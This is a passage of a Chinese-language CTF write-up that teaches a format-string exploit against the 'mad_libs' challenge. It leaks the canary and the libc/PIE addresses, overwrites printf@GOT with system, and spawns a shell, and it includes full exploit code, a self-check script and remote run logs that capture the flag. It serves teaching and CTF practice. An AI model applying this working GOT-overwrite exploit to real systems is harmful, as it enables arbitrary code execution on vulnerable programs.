pwntools 內建自動探測（原理就是技巧 A）：

```python
def send_payload(payload):
    p.sendline(payload)
    return p.recvline()
autofmt = FmtStr(execute_fmt=send_payload)
print(autofmt.offset)     # → 8
```

### 技巧 C：直接掃一大段

`%N$p` 很占長度（`%100$p` 就 6 個字元），一次塞不下太多。**分次掃**：

```python
for lo in (1, 41, 81):                      # 每次印 40 個，注意 <255 字元
    fmt = b'|'.join(b'%%%d$p' % i for i in range(lo, lo+40))
    p.sendline(fmt)
```

本題就是這樣一路掃到第 80 個參數，才找到 `PIE+0x11c9`（第 47 個）。

### 技巧 D：確認 offset 不會漂移

`%N$p` 的參數編號由「堆疊框配置 + libc 的 printf 實作」決定。**同一份 libc + 同一支程式 = 固定**。
但要驗證的話：把 `buf[0]` 的標記改成別的內容，重跑幾次，確認那個位置永遠印出你的標記。

> 本題的 8 是 **glibc 2.39 的 printf** 行為。換 libc 版本時這個數字**可能不同**（例如有些題目是 6），所以永遠要實測。

---

## 5. 洩漏（leak）了什麼、怎麼換算 libc base

我們在**第 1 次迴圈**送出：

```python
b'%41$p|%42$p|%43$p|%47$p'
```

得到（遠端真實輸出）：

```
0x159dc03394a54300|0x7fffad6b7710|0x74c6d28001ca|0x5deeff4bb1c9
```

| 參數 | 位址 | 值 | 意義 |
|---|---|---|---|
| 41 | `rbp-0x8` | `0x159dc03394a54300` | **stack canary**（結尾一定是 `00`，因為最低位元組是 NUL） |
| 42 | `rbp+0` | `0x7fffad6b7710` | **saved rbp**，指到 stack（教學用；本解法不需要） |
| 43 | `rbp+8` | `0x74c6d28001ca` | **main 的返回位址** = `libc_base + 0x2a1ca` |
| 47 | `rbp+0x28` | `0x5deeff4bb1c9` | **main 的位址** = `PIE_base + 0x11c9` |

### 為什麼第 43 個是 `libc + 0x2a1ca`？

`main` 是被 **`__libc_start_call_main`** 呼叫的。我們反組譯 libc 的那個位置：

```console
$ objdump -d -M intel --start-address=0x2a1c0 --stop-address=0x2a1d0 libc.so.6
   2a1c4: 48 8b 45 88    mov    rax,QWORD PTR [rbp-0x78]   ; rax = main
   2a1c8: ff d0          call   rax                        ; ← 呼叫 main
   2a1ca: 89 c7          mov    edi,eax                    ; ★ 返回位址就是這裡
   2a1cc: e8 bf d9 01 00 call   47b90 <exit>               ;   exit(main 的回傳值)
```

`call rax` 把**下一行（0x2a1ca）** 推進堆疊當返回位址；`main` 一執行 `ret` 就回到這裡。
→ **`0x2a1ca` 是這份 libc 專屬的常數**，跨多次執行都一樣（已驗證）。

### 換算式

```python
LIBC_RET_OFFSET = 0x2a1ca     # __libc_start_call_main 裡 call main 的下一行
MAIN_OFFSET     = 0x11c9      # _start 的 lea rdi,[rip+0xca] 算出來的 main

libc_base = leak_43 - LIBC_RET_OFFSET    # 0x74c6d28001ca - 0x2a1ca = 0x74c6d27d6000
pie_base  = leak_47 - MAIN_OFFSET        # 0x5deeff4bb1c9 - 0x11c9  = 0x5deeff4ba000
```

驗算（遠端）：
```
0x74c6d28001ca - 0x2a1ca = 0x74c6d27d6000   ← 頁對齊（結尾 000）✅
0x5deeff4bb1c9 - 0x11c9  = 0x5deeff4ba000   ← 頁對齊 ✅
```
**兩個 base 都必須是 0x1000 的倍數**，這是驗證算式有沒有錯的最好方法（程式裡有 assert 檢查）。

### 從 libc base 到 `system`

```console
$ readelf -sW libc.so.6 | grep -E " system@@| printf@@"
   528: 0000000000047b90    30 FUNC  GLOBAL DEFAULT  17 exit@@GLIBC_2.2.5
  1050: 0000000000058740    45 FUNC  WEAK   DEFAULT  17 system@@GLIBC_2.2.5
  2611: 00000000000600f0   204 FUNC  GLOBAL DEFAULT  17 printf@@GLIBC_2.2.5
```

```python
system     = libc_base + 0x58740
printf_got = pie_base  + 0x4010
```

### 洩漏與覆寫的「鐵證」（直接讀目標行程記憶體）

```console
maps   libc=0x7f59a7200000 pie=0x7f59a7559000
leaked libc=0x7f59a7200000 pie=0x7f59a7559000  -> match: True
canary=0xf45bad45e803db00  (ends 00: True)
printf@GOT before write: 0x7f59a72600f0  (libc printf = 0x7f59a72600f0)
printf@GOT after  write: 0x7f59a7258740  (system     = 0x7f59a7258740)  -> True
```

（用 `/proc/<pid>/maps` 比對載入位址、用 `/proc/<pid>/mem` 直接讀 GOT，證明我們算的位址完全正確。）

**這段是可以自己重跑、自己證明的**（不需要 gdb，也不需要相信任何人的數字）。
把下面存成 `pwn2/selfcheck.py` 執行，你會看到「GOT 真的變成 `system`」：

```python
from pwn import *
import time
context.log_level = 'error'
context.arch = 'amd64'

io  = process(['./ld-linux-x86-64.so.2', '--library-path', '.', './mad_libs'], cwd='.')
pid = io.pid

io.recvuntil(b'(1) > ')
io.sendline(b'|'.join(b'%%%d$p' % i for i in (41, 43, 47)))
line = io.recvuntil(b'(2) > ', timeout=5)[:-len(b'(2) > ')].strip()
canary, ret, mainp = (int(x, 16) for x in line.split(b'|'))
libc_base, pie_base = ret - 0x2a1ca, mainp - 0x11c9      # 洩漏值換算 base

def base_of(name):                                        # 問核心：這個檔被載到哪
    maps = open('/proc/%d/maps' % pid).read()
    return int([l for l in maps.splitlines() if name in l][0].split('-')[0], 16)

print('maps  libc=%#x pie=%#x' % (base_of('libc.so.6'), base_of('mad_libs')))
print('leak  libc=%#x pie=%#x' % (libc_base, pie_base))   # 兩者必須一模一樣且頁對齊

def mem(addr, n=8):                                       # ★ 直接讀行程記憶體
    with open('/proc/%d/mem' % pid, 'rb') as f:
        f.seek(addr); return f.read(n)

system     = libc_base + 0x58740
printf_got = pie_base  + 0x4010
print('printf@GOT before = %#x   (libc printf = %#x)' % (u64(mem(printf_got)), libc_base + 0x600f0))

payload = fmtstr_payload(8, {printf_got: p64(system)[:6]},
                         write_size='byte', numbwritten=0, badbytes=b'\n')
io.sendline(payload)                                      # 第 2 次迴圈：改 GOT
time.sleep(0.5)
after = u64(mem(printf_got))
print('printf@GOT after  = %#x   (system     = %#x)  match=%s' % (after, system, after == system))
io.sendline(b'/bin/sh'); time.sleep(0.4); io.recvrepeat(0.3)
io.sendline(b'echo SHELL_OK; id; echo DONE')              # 第 3 次迴圈：printf(buf) == system(buf)
print(io.recvuntil(b'DONE', timeout=5))
io.close()
```

實測輸出：

```console
$ cd /home/kzzz/Documents/code/ctf/sunshine/pwn2 && python3 selfcheck.py
maps  libc=0x7f6683000000 pie=0x7f668327b000
leak  libc=0x7f6683000000 pie=0x7f668327b000
printf@GOT before = 0x7f66830600f0   (libc printf = 0x7f66830600f0)
printf@GOT after  = 0x7f6683058740   (system     = 0x7f6683058740)  match=True
b'SHELL_OK\nuid=1001(kzzz) gid=1001(kzzz) groups=1001(kzzz),65534(nobody)\nDONE'
```

* `maps` 與 `leak` 兩行完全相同 → 我們的換算式是對的；
* `printf@GOT` 從 `libc+0x600f0`（真 `printf`）變成 `libc+0x58740`（`system`）→ **覆寫確實發生了**；
* 最後 `SHELL_OK` 是 shell 印的 → 不是「好像成功」，是**真的拿到 shell**。

> 💡 這個 `/proc/<pid>/mem` 自檢法對所有 GOT 覆寫題都適用：**不要用「有沒有看到 shell 訊息」判斷成功，
> 直接把 GOT 讀回來比對。**（本機 `process()` 的 stderr 會併到 stdout，很容易誤判。）

### 為什麼只寫 6 bytes？（`p64(system)[:6]` 的那個 `[:6]`）

第一次看到 `p64(system)[:6]` 一定會想：「位址不是 8 bytes 嗎？為什麼截掉 2 bytes、
只寫 6 bytes 進 GOT，之後 `printf` 跳過去不會跳到半個位址嗎？」

答案：**不用擔心，因為最高的 2 bytes 本來就是 `\x00\x00`，它們沒有資訊。**

* x86-64 Linux 的使用者空間位址是 **47-bit canonical**：一般映射（libc、PIE、heap、stack）
  一律落在 `0x0000_7fff_ffff_ffff` 以下（本機實測 `mad_libs` 行程的所有映射，
  排除固定的 `[vsyscall]` 那頁之後，最大值是 `0x7ffc03846000`）。
* 所以一個 libc 位址寫成 8 bytes 時長這樣（小端）：
  ```
  system = 0x00007f6683058740
  實際 bytes： 40 87 05 83 66 7f | 00 00
               └── 我們要寫的 6 bytes ──┘ └ 永遠是 0 ┘
  ```
* 而 GOT 那一格本來存的是「真 `printf` 的位址」（同樣是 `0x00007f…`），
  **它的第 7、8 byte 也已經都是 `\x00`** → 所以那 2 bytes **根本不需要改**。

⇒ 寫 6 bytes 就等於寫完整的 8 bytes（GOT 那格本來就是對的），而且**payload 更短**：

實測同一個目標、同一個值，只差在寫 6 或 8 bytes：

```python
system, got = 0x00007f6683058740, 0x404010
fmtstr_payload(8, {got: p64(system)[:6]}, write_size='byte', write_size_max='byte',
               numbwritten=0, badbytes=b'\n')   # → len = 112
fmtstr_payload(8, {got: p64(system)     }, write_size='byte', write_size_max='byte',
               numbwritten=0, badbytes=b'\n')   # → len = 144（多 2 個 %hhn + 2 個位址槽）
```

* 強制每個 byte 一個 `%hhn` 時，**6 bytes = 112 bytes、8 bytes = 144 bytes**（差 32）；
* 用預設的 `write_size_max='long'` 時兩者剛好都是 96 bytes（pwntools 會聰明地用一次
  `%15$lln` 把 8 bytes 一次寫掉）—— 所以「寫 8 個 byte 也能通，只是通常沒必要」。

**實務上大家選 6 bytes 的理由**就是前者：`mad_libs` 用 `fgets(buf, 255, ...)` 收輸入，
**payload 越短越安全**（§3.4 的長度討論、§9 的坑）。少寫 2 個「永遠是 0」的 byte
就少 2 個寫入與 2 個位址槽，能省下約 32 bytes 的空間。

> 註：這是「**4-level paging（48-bit VA）**」的常態。若機器開了 **5-level paging（LA57）**，
> 使用者位址可能超過 `2^48`，那時就**不能**只寫 6 bytes（要用 7～8 bytes）。
> **判斷方法很簡單：看你洩漏到的位址長什麼樣** —— 把洩漏值用 `hex()` 印出來，
> 如果它 ≤ `0x7fffffffffff`（＝最高 2 bytes 是 `00 00`），寫 6 bytes 就是安全的。
> 本系列 7 題都是（實測最高映射 `0x7ffc03846000`）。


---

## 6. 攻擊計畫

```
第 1 次迴圈（i=0）: %41$p|%42$p|%43$p|%47$p
     ↓  算出 libc_base、pie_base、system、printf@GOT(絕對位址)

第 2 次迴圈（i=1）: 一組 %n 家族指令（常見是 5~6 個 %hhn，也可能被合併成 %hn/%n）
                    把 printf@GOT 改成 system
     ↓  注意：這次的 printf(buf) 本身還在 libc 的 printf 裡跑，改 GOT 不影響它；
        但要等下一次「呼叫 printf@plt」才會生效

第 3 次迴圈（i=2）: 
     printf("(%d) > ", 3)  →  變成  system("(%d) > ")
                                 ↑ 只會在 stderr 印一行 sh 語法錯誤，無害
     fgets(buf,0x100,stdin) →  讀到我們送的 "/bin/sh"
     printf(buf)           →  變成  system("/bin/sh")   ★GETSHELL★
```

為什麼這樣可行？

* `system(cmd)` 會 `fork` 一個 `/bin/sh -c cmd` 子行程，**繼承同一組 stdin/stdout/stderr**（也就是我們的 socket），所以 shell 直接對我們說話。
* `system("(%d) > ")` 產生的 `sh: -c: line 1: syntax error` 訊息走 **stderr**，完全無害，而且**證明 GOT 真的被改了**。
* 第 2 次迴圈的 printf 呼叫時，GOT 已被改；但 CPU 早就在 `printf` 裡面了，接下來只會呼叫 libc **內部**的函式（direct call，不經 PLT），所以不會自己爆炸。

---

## 7. `exploit.py` 逐行解說

> **以下為了閱讀方便做了精簡**：省略了 `try/except`、`log.xxx()` 訊息、以及常數宣告的細節，
> 完整內容請直接看 `exploit.py`。實務上解析 leak **一定**要包 `try/except`
> （殘留值有可能是 `(nil)`，`int(b"(nil)", 16)` 會丟 `ValueError`，見 §9-6），
> 下面那個一行版是「簡化示意」，不要照抄到正式腳本裡。
> `exploit.py:109-127` 才是真版本：`raw.split(b"|")` 取四個字串 → 各自 `int(x, 16)` → 失敗就重連。

```python
import sys, time

# ⚠️ 重要：pwntools 的 pwnlib.args 會把「看起來像識別字」的命令列參數
#    從 sys.argv 裡刪掉（free_form=True）。所以 `REMOTE` 會在 import pwn 後消失，
#    必須在 import 之前先讀。
REMOTE_MODE = len(sys.argv) > 1 and sys.argv[1].upper() == "REMOTE"

from pwn import *

HOST, PORT = "chal.sunshinectf.games", 26001
HERE = os.path.dirname(os.path.abspath(__file__))

context.arch = "amd64"
context.log_level = "info"

elf  = ELF(os.path.join(HERE, "mad_libs"),  checksec=False)   # 讀 GOT offset
libc = ELF(os.path.join(HERE, "libc.so.6"), checksec=False)   # 讀 system offset

PRINTF_GOT = elf.got["printf"]        # 0x4010（不寫死，直接讀 ELF）
SYSTEM     = libc.symbols["system"]   # 0x58740
```

> ⚠️ `context.arch = "amd64"` **一定要在呼叫 `fmtstr_payload()` / `p64()` 之前**設好。
> 沒設的話 pwntools 會用預設的 32-bit 來打包位址，你會看到
> `ValueError: pack(): number does not fit within word_size`（8 bytes 的位址塞不進 4 bytes）。
> 同理，`SigreturnFrame()` 也需要它（見 `wp/00_基礎知識_從零開始.md` §11.4）。

用 `ELF()` 讀 offset 而不是把數字寫死，是嚴謹的作法：萬一檔案換了，數字會自動跟著對。

```python
BUF_POS = 8                    # buf[0] 是 printf 的第 8 個參數（實測）
P_CANARY    = BUF_POS + 33     # 41  → [rbp-0x8]
P_SAVED_RBP = BUF_POS + 34     # 42  → [rbp]
P_RET       = BUF_POS + 35     # 43  → [rbp+8]
P_MAIN      = BUF_POS + 39     # 47  → PIE+0x11c9

RET_OFF_IN_LIBC = 0x2a1ca      # __libc_start_call_main 裡 call main 的下一行
MAIN_OFF_IN_PIE = 0x11c9       # main
```

推導：`rbp-0x8` 距離 `rbp-0x110`（buf[0]）是 `0x108` bytes = 33 個 slot → `8+33 = 41`。
`rbp+0` → 34 個 slot → 42；`rbp+8` → 43；`rbp+0x28` → 41 個 slot → 47。

```python
def start():
    if REMOTE_MODE:
        return remote(HOST, PORT)
    return process(["./ld-linux-x86-64.so.2", "--library-path", ".", "./mad_libs"], cwd=HERE)
```

本機用題目附的 loader + libc 跑，**不 patch 檔案**。

```python
def build_write_payload(where, what):
    return fmtstr_payload(
        BUF_POS,                    # 我們控制的第 1 個參數編號
        {where: p64(what)[:6]},     # 只寫 6 bytes（48-bit 的 libc 位址）
        write_size="byte",          # 想以 1 byte 為單位寫
        numbwritten=0,              # 在這之前 printf 還沒印過東西
        badbytes=b"\n",             # 不能在 payload 裡出現 0x0a（fgets 會斷行）
    )
```

> ⚠️ `write_size="byte"` **不代表**輸出一定是 6 個 `%hhn`：`fmtstr_payload` 的 `write_size_max` 預設是
> `"long"`，它會把相鄰 byte 合併成 `%hn`/`%n`。想強制 1 byte 一個 `%hhn` 要再傳 `write_size_max="byte"`。
> 兩者都能打通本題（見 §3.4）。

`p64(what)[:6]`：`system` 的位址在 x86-64 使用者空間只用到低 6 bytes（＝48 bits；
高位 2 bytes 恆為 `\x00\x00`），寫 6 bytes 就夠，第 7、8 byte 本來就是 0，不用動。
（完整推導與「為什麼不能寫 8 bytes」見上面 §5 的「為什麼只寫 6 bytes？」。）
`fmtstr_payload` 會自動：切 byte → 依數值排序 → 算好每個 `%<width>c` → 把位址補到 8-byte 邊界 → 產生正確的 `%N$hhn` / `%N$hn` / `%N$n` 索引（哪一種取決於 `write_size_max`，見上面 ⚠️）。

```python
def exploit_once():
    io = start()

    # ---- 第 1 次迴圈：leak ----
    io.recvuntil(b"(1) > ")
    leak_fmt = b"|".join(b"%%%d$p" % p for p in (P_CANARY, P_SAVED_RBP, P_RET, P_MAIN))
    io.sendline(leak_fmt)
    chunk = io.recvuntil(b"(2) > ", timeout=5)
    raw = chunk[:-len(b"(2) > ")].strip()
```

`recvuntil(b"(2) > ")` 會把「leak 輸出 + 下一個提示字元」一起收到，所以要把提示字元切掉。
（stdout 是 `_IONBF` 無緩衝，所以 leak 一定會先到。）

```python
    canary, saved_rbp, ret, mainp = (int(x, 16) for x in raw.split(b"|"))

    if canary & 0xFF != 0 or ret & 0xFFF != RET_OFF_IN_LIBC & 0xFFF:
        return None                     # 檢查 leak 合理性，不合理就重連
    libc_base = ret   - RET_OFF_IN_LIBC
    pie_base  = mainp - MAIN_OFF_IN_PIE
```

`sanity check`：
* canary 最低位元組一定是 `0x00`（glibc 故意把最低 byte 設成 NUL，讓 `strlen`/`printf("%s")` 這類字串函式不會不小心把 canary 洩漏出去）。
* 返回位址的後 3 個 nibble 一定跟 `0x2a1ca` 一樣（`...1ca`）。

```python
    if libc_base & 0xFFF or pie_base & 0xFFF:
        return None                     # 兩個 base 都必須頁對齊
```

這是**最有用的檢查**：如果 libc 版本不對、或 offset 抄錯，這裡就會擋下來。

```python
    system     = libc_base + SYSTEM
    printf_got = pie_base  + PRINTF_GOT

    payload = build_write_payload(printf_got, system)
    if b"\n" in payload or len(payload) > 0xFF:
        return None                     # 含換行會斷、太長會被 fgets 截斷 → 重連換 ASLR
    io.sendline(payload)
```

`0x0a` 檢查必要：目標位址的隨機位元組有約 2% 機率含 `0x0a`，那就會斷行。重連一次 ASLR 就換了，所以 retry 迴圈（最多 5 次）就夠。

```python
    time.sleep(0.5); drain(io, 0.3)
    io.sendline(b"/bin/sh")             # 下一次的 printf(buf) 會變成 system(buf)
    time.sleep(0.4); drain(io, 0.3)
    io.sendline(CMD)                    # cat flag.txt /flag ...; ls -la; id; echo DONE
    ... 讀到 "DONE" 為止 ...
```

用 `sleep + drain` 而不是 `recvuntil(b"(3) > ")`，因為**第 3 次迴圈的提示字元已經不會以 printf 的形式出現**（它變成 `system("(%d) > ")` 了）。等提示字元會卡住。
（另外：`pwnlib` 的 `recvuntil` 若逾時，它回傳空字串但**資料還留在內部緩衝區**，後面才會吐出來 → 會讓輸出順序錯亂。所以這裡直接 drain。）

```python
    m = re.search(rb"sun\{[^}\n]*\}", out)
    if m: print("FLAG: %s" % m.group(0).decode())
```

不用 TTY：整個流程只是送幾行字、讀回來，stdin 是 `/dev/null` 也照跑。

---

## 8. 實際執行結果

> **先讀這句**：以下兩段是**某一次**執行的紀錄。ASLR 每次不同，
> 所以 `write payload` 的**長度**（96 / 112 / 120…）和**組成**（幾個 `%hhn`、會不會出現 `%hn`/`%n`）**也會不同**（見 §3.4）。
> 唯一不變的是：`len(payload) <= 0xFF`（`fgets` 上限）、不含 `\n`、而且 `printf@GOT` 最後等於 `system`。
> 想確認 GOT 真的被改，請用 §5 的 `/proc/<pid>/mem` 自檢腳本。

### 本機（先自己造一個假 flag）

```console
$ echo 'sun{LOCAL_DUMMY_FLAG}' > flag.txt
$ python3 exploit.py < /dev/null
[*] starting local process with the bundled loader/libc
[+] Starting local process './ld-linux-x86-64.so.2': pid 3499910
[*] leak line: 0x...|0x7ffd267ccef0|0x7f9949a2a1ca|0x7f9949d1a1c9
[+] canary      = 0x...
[+] saved rbp   = 0x7ffd267ccef0
[+] libc leak   = 0x7f9949a2a1ca  -> libc base = 0x7f9949a00000
[+] main leak   = 0x7f9949d1a1c9  -> PIE  base = 0x7f9949d19000
[+] system      = 0x7f9949a58740
[+] printf@GOT  = 0x7f9949d1d010
[*] write payload (112 bytes): b'%64c%16$hhn%9c%17$hhn%54c%18$hhn%8c%19$hhn%18c%20$hhn%12c%21$hhn...'   ← 這次 6 個 %hhn
[*] printf@GOT should now contain system()
[*] Stopped process
sun{LOCAL_DUMMY_FLAG}
total 2348
drwxr-xr-x  2 kzzz kzzz    4096 Sep 28 00:24 .
-rw-r--r--  1 kzzz kzzz      22 Sep 28 00:15 flag.txt
-rwxr-xr-x  1 kzzz kzzz  236616 Sep 28 00:09 ld-linux-x86-64.so.2
-rwxr-xr-x  1 kzzz kzzz 2125328 Sep 28 00:09 libc.so.6
-rwxr-xr-x  1 kzzz kzzz   14584 Sep 28 00:09 mad_libs
uid=1001(kzzz) gid=1001(kzzz) groups=1001(kzzz),65534(nobody)
DONE

FLAG: sun{LOCAL_DUMMY_FLAG}
```

### 遠端（真 flag）

```console
$ python3 exploit.py REMOTE < /dev/null
[*] connecting to chal.sunshinectf.games:26001
[+] Opening connection to chal.sunshinectf.games on port 26001: Done
[*] leak line: 0x159dc03394a54300|0x7fffad6b7710|0x74c6d28001ca|0x5deeff4bb1c9
[+] canary      = 0x159dc03394a54300
[+] saved rbp   = 0x7fffad6b7710
[+] libc leak   = 0x74c6d28001ca  -> libc base = 0x74c6d27d6000
[+] main leak   = 0x5deeff4bb1c9  -> PIE  base = 0x5deeff4ba000
[+] system      = 0x74c6d282e740
[+] printf@GOT  = 0x5deeff4be010
[*] write payload (120 bytes): b'%64c%17$hhn%52c%18$hhn%14c%19$hhn%68c%20$hhn%12c%21$hhn%21c%22$hhnaaaaba...'   ← 這次也是 6 個 %hhn
[*] printf@GOT should now contain system()
[*] Closed connection to chal.sunshinectf.games port 26001
sun{f1ll_iN_th3_g0T_eNtry}
total 12
drwxr-xr-x 2 root root     4096 Sep 26 00:21 .
drwxr-xr-x 1 root root     4096 Sep 26 00:54 ..
-rw-r----- 1 root mad_libs   27 Sep 26 00:13 flag.txt
uid=1337(mad_libs) gid=1337(mad_libs) groups=1337(mad_libs)
DONE

FLAG: sun{f1ll_iN_th3_g0T_eNtry}
```

> 遠端工作目錄裡只有 `flag.txt`（`-rw-r----- mad_libs:mad_libs`），`/flag`、`/home/*/flag.txt` 都不存在，所以命令裡的 `2>/dev/null` 剛好把「檔案不存在」的訊息吃掉。

**真實 flag：`sun{f1ll_iN_th3_g0T_eNtry}`**（已寫入 `FLAG.txt`）

可靠性：本機 3/3 成功、遠端 4/4 成功。

---

## 9. 常見坑（踩過才知道痛）

1. **參數編號不要猜。** 這題是 `%8$p` 不是 `%6$p`。`%6$p`/`%7$p` 印出來的是 `rbp-0x120`、`rbp-0x118` 的**殘留**（每次執行都可能不同）；`i` 住在 `[rbp-0x114]`，也就是 pos 7 的**高 4 bytes**，而 `printf(buf)` 跑在第一次迴圈時 `i = 0`，所以那個高半部固定是 0。這些值看起來「很像」某種東西，但都不是你的輸入。
2. **`\n` 不能出現在 payload 裡。** `fgets` 讀到換行就停。目標位址的位元組是隨機的，約 2% 機率含 `0x0a` → 一定要檢查並重連（重連會換 ASLR）。
3. **`\x00` 會讓 `printf` 提前結束**。所以**位址一定要放在格式指令的後面**。前面的 `%hhn` 全部執行完之後 printf 才撞到 NUL，所以無害。（若把位址放開頭，`\x00` 會讓後面的指令全部失效。）
4. **位址區必須 8-byte 對齊**。`buf[0]` 是第 8 個參數，位址若從 `buf[4]` 開始，`%8$hhn` 讀到的會是「半個位址 + 半個別的」→ 寫到錯誤的地方（通常直接 segfault）。用 `fmtstr_payload` 並檢查產生的 payload 長度，或自己補 `aaa`/`aaaa` 對齊。
5. **要算進 `%n` 的值只有「真的被印出來的字元」**。格式指令本身（`%64c`、`%17$hhn`、`%n`）**不會印出任何東西**，所以不增加計數；`%64c` 只貢獻 64。會增加計數的只有兩種：`%<寬度>c` 的填充、以及格式字串裡**不是格式指令**的裸文字（例如對齊用的 `aaaaba` 貢獻 6）。所以 `%64c%17$hhn` 執行到 `%17$hhn` 那一刻的計數是 **64**，不是 64+7 = 75。
   想自己驗證：把位址指到一個可寫位址（或 `printf@GOT`），寫完後用 `/proc/<pid>/mem` 讀回來看最低 byte 是不是你要的值（見 §5 的自檢腳本）。
   （實測：手寫 `%64c%17$hhn` 去寫一個可寫位址，結果值是 `0x40` = 64；如果是 0x47 = 71，就代表「格式指令會計數」，但事實並非如此。）
6. **`%p` 對 0 會印 `(nil)`**，`int(b"(nil)",16)` 會 exception。解析 leak 時要處理。
7. **改完 GOT 後不要再等 `"(3) > "` 提示字元**。第 3 次迴圈的提示已被 `system("(%d) > ")` 取代，那個字串永遠不會出現 → `recvuntil` 會等到 timeout。
8. **`system` 的 stderr 訊息是正常的**：bash 會說 `sh: -c: line 1: syntax error near unexpected token 'newline'`，dash 會說 `sh: 1: Syntax error: "(" unexpected`。它代表 GOT 確實被改成 `system` 了 —— 不要被嚇到以為壞了（但本 exploit 會把它 drain 掉，所以你不一定看得到；見第 14 條）。
9. **只有 8 次機會**（`i=0..7`）。我們用了 3 次（leak / write / getshell），很寬裕。但如果你用 `%hn` 分多次寫、或想多 leak 幾輪，要記得數。
10. **libc 版本差異**：`0x2a1ca`、`0x58740`、`0x600f0` 都是**這份附件 libc**（`GNU C Library (Ubuntu GLIBC 2.39-0ubuntu8.3)`，BuildID `6d64b17fbac799e68da7ebd9985ddf9b5cb375e6`）專屬的。換 libc 就要重找。
    找不到 `__libc_start_call_main` 的 symbol 沒關係（stripped），可以搜尋 `call rax` 後面接 `mov edi,eax; call exit` 的樣式。
11. **PIE 與 libc 的距離不是固定的**（本機 `0x332000`/`0x333000`/`0x39a000` 都出現過；遠端 PIE 在 `0x5d...`）。**一定要各自洩漏**，不能只算一個。
12. **`recvuntil(timeout=...)` 逾時時，資料不會消失**，而是留在 pwntools 的內部緩衝區，之後的 `recv` 才吐出來。這會讓「你以為的輸出順序」全部錯亂。逾時後要改寫流程，不要接著用 `recvuntil`。
13. **`pwntools` 會吃掉 `sys.argv` 裡像識別字的參數**（`pwnlib.args` 的 `free_form`）。`python3 exploit.py REMOTE` 裡的 `REMOTE` 會在 `from pwn import *` 之後消失 → 本 exploit 自己解析 `sys.argv[1]`，所以**要在 import 之前讀 argv**。
    > 💡 如果你用的是 pwntools 官方的 `args.REMOTE`（`wp/00_基礎知識_從零開始.md` §12 的骨架），那不用理這條 —— 實測 `sys.argv` 會從 `['-c','REMOTE']` 變成 `['-c']`，但同一時間 **`args.REMOTE == True`**，官方用法照樣正常。會出問題的只有「自己讀 `sys.argv[1]`」的寫法。
14. **`system("(%d) > ")` 會讓 shell 在 stderr 抱怨語法錯誤**（bash：`sh: -c: line 1: syntax error near unexpected token \`newline'`；dash：`sh: 1: Syntax error: "(" unexpected`）。
    本 exploit 用 `drain()` 把那段輸出**讀掉丟棄**，所以你在 §8 的輸出裡看不到 —— 這是刻意的。
    遠端也不一定轉發 stderr，**不要靠這行訊息判斷成功**；要看 GOT 是否真的被改（§5 的 `/proc/<pid>/mem` 自檢）。
15. **`fgets` 讀不到資料（EOF）會直接跳出迴圈**（`test rax,rax; je 1276`）。所以如果你一次把 payload 送完就關閉 stdin，程式會提前結束。
16. **本機用 `./mad_libs` 直接跑會噴 symbol lookup error**，一定要用題目的 loader：`./ld-linux-x86-64.so.2 --library-path . ./mad_libs`。

---

## 10. 其他也可以成功的路線（附錄）

### (A) 改 `fgets@GOT` → `system`（本解法之外最常見的變體）

把 `fgets@GOT`（`PIE+0x4018`）改成 `system`。然後在 buffer 裡放：

```
/bin/sh;#AAAAAAAAAAAAAAAA...
```

* 下一輪 `fgets(buf, 0x100, stdin)` 變成 `system(buf)`。
* 但 `system` 會忽略 `esi`/`rdx`，所以 `system("/bin/sh;#...")` → `sh -c "/bin/sh;#..."`。
* 這樣只會開一個非互動的 `/bin/sh -c`，**不適合要下指令的場合**；而且 `printf(buf)` 那邊還印出 `/bin/sh;#...`。
* 相較之下，改 `printf@GOT` 更乾淨：`system(buf)` 直接拿到一個**互動式** shell。

### (B) 改 `printf@GOT` → `one_gadget`

`one_gadget` 是 libc 裡「執行到就 `execve("/bin/sh")`」的單一位址（不用傳參數）。但：
* 有 constraint（例如 `[rsp+0x50] == NULL`），不保證成立；
* 這台機器**沒裝 `one_gadget`**。
所以本題不建議。

### (C) 覆寫 `main` 的返回位址

`main` 的返回位址在第 43 個參數，我們已經能讀到它的**值**（libc 位址）。
但要**寫**它就得知道它在堆疊上的**絕對位址**（`main` 的 `rbp + 8`）。我們洩漏的是 `[rbp]` 的**內容**（caller 的 rbp），不是 `rbp` 本身，所以還需要一個常數差；而且就算寫成功，`main` 返回時 `rdi` 也不受我們控制（不是 `system` 想要的參數）。
→ **GOT 路線簡單太多**。

### (D) 用 `%s` 洩漏 libc 內容以辨識 libc 版本

若遠端 libc 未知，可以讀 GOT 裡的 `puts` 位址（`%<idx>$s` 需要位址在參數裡），拿到 libc 實際 base 後再對照 libc database 找出正確的 libc。本題附件已經給了 libc，所以不需要。

---

## 11. 一行指令重現

```console
$ cd /home/kzzz/Documents/code/ctf/sunshine/pwn2
$ python3 exploit.py REMOTE < /dev/null | tee remote.log | grep -A5 'FLAG:'
```

---

## 12. 產出檔案

| 檔案 | 內容 |
|---|---|
| `exploit.py` | 完整 exploit，支援 `python3 exploit.py`（本機）與 `python3 exploit.py REMOTE`（遠端） |
| `FLAG.txt` | 真實 flag：`sun{f1ll_iN_th3_g0T_eNtry}` |
| `notes.md` | 本教學筆記 |
| `flag.txt` | 本機測試用的假 flag |
